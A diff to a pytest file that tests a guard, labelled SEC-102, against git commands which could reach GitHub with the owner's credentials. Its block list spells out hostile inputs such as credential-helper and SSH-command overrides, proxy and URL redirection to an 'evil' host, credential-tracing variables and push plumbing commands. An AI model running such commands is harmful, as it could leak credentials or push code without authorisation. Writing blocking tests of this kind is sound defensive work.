@@ -286,6 +286,50 @@ def test_settings_deny_git_folders_credentials_and_profiles():
             "Edit(**/*profile.ps1)", "Write(**/*profile.ps1)", "Edit(~/.config/git/**)"} <= deny
 
 
+SEC102_BLOCKED = [
+    # one-off git settings on any git command, not only push and config
+    "git -c credential.helper=!evil fetch", "git -c credential.helper= -c credential.helper=x pull",
+    "git -c core.sshCommand=evil ls-remote origin", "git -c http.proxy=http://evil fetch origin",
+    "git -c alias.x=push x origin main", "git -c remote.origin.url=x fetch", "git -ccredential.helper=x fetch",
+    "git --config-env=credential.helper=VAR fetch", "git --config-env credential.helper=VAR fetch",
+    "git -C . -c http.extraHeader=x clone https://github.com/x/y", "sh -c 'git -c core.askPass=x fetch'",
+    "git -c url.https://evil/.insteadOf=https://github.com/ fetch",
+    # variables in front of a command, through env/export/set, or PowerShell's $env:
+    "GIT_TRACE_CURL=1 git fetch", "GIT_CURL_VERBOSE=1 git ls-remote origin", "GCM_TRACE=1 git fetch",
+    "GIT_ASKPASS=evil git fetch", "GIT_SSH_COMMAND=evil git fetch", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=x git fetch",
+    "GIT_CONFIG_PARAMETERS=x git pull", "env GIT_TRACE=1 git fetch", "export GIT_TRACE=1; git fetch",
+    "export GIT_TRACE=1 && git fetch", "declare -x GIT_DIR=x", "typeset -x GIT_DIR=x", "set GIT_TRACE=1",
+    "HTTPS_PROXY=http://evil git fetch", "https_proxy=x git fetch", "ALL_PROXY=x git fetch",
+    "SSL_CERT_FILE=x git fetch", "CURL_CA_BUNDLE=x git fetch", "BASH_ENV=x bash -c 'git fetch'",
+    "ENV=x sh -c 'git fetch'", "GIT_EDITOR=x GIT_TRACE=1 git fetch", "printf -v GIT_TRACE 1",
+    "read GIT_DIR < x", "GIT_DIR+=x git status",
+    "$env:GIT_TRACE = 1; git fetch", "$env:GCM_TRACE='1'", "Set-Item env:GIT_ASKPASS evil",
+    "New-Item -Path env:\\GIT_TRACE -Value 1", "${env:GIT_TRACE} = 1",
+    # git's lower-level commands that push without the word push
+    "git send-pack https://github.com/x/y main", "git http-push https://github.com/x/y main",
+    "git remote-https origin https://github.com/x/y", "git remote-ext x y", "git receive-pack .",
+    "git-send-pack https://github.com/x/y main", "git-http-push x", "git-remote-https origin x",
+    "\"C:/Program Files/Git/mingw64/libexec/git-core/git-send-pack.exe\" x main",
+]
+
+
+@pytest.mark.parametrize("command", SEC102_BLOCKED)
+def test_one_off_git_settings_risky_variables_and_push_plumbing_are_blocked(command):
+    """SEC-102: the repository is private, so any git command that reaches GitHub uses Khalid's sign-in."""
+    guard = _guard()
+    assert guard.reason(command) or guard.reason(command, powershell=True), command
+
+
+@pytest.mark.parametrize("command", [
+    "git fetch", "git fetch origin", "git pull", "git ls-remote origin", "git clone https://github.com/x/y",
+    "git -C apps/snafi-web status", "git log -c --oneline", "git diff -c HEAD~1", "FOO=1 git status",
+    "GIT_EDITOR=true git commit -q -F msg.txt", "GIT_PAGER=cat git log -1", "NO_PROXY=x npm test",
+    "echo $GIT_EDITOR", "python scripts/dev.py test -q", "git commit -q -m 'Read the docs'",
+])
+def test_ordinary_git_and_harmless_variables_still_run(command):
+    assert _guard().reason(command) is None, command
+
+
 def test_guard_finds_new_home_in_the_home_design_team_folder():
     guard = _guard()
     assert Path(guard.HOME_PROJECT) == ROOT / "teams" / "home-design" / "New Home"
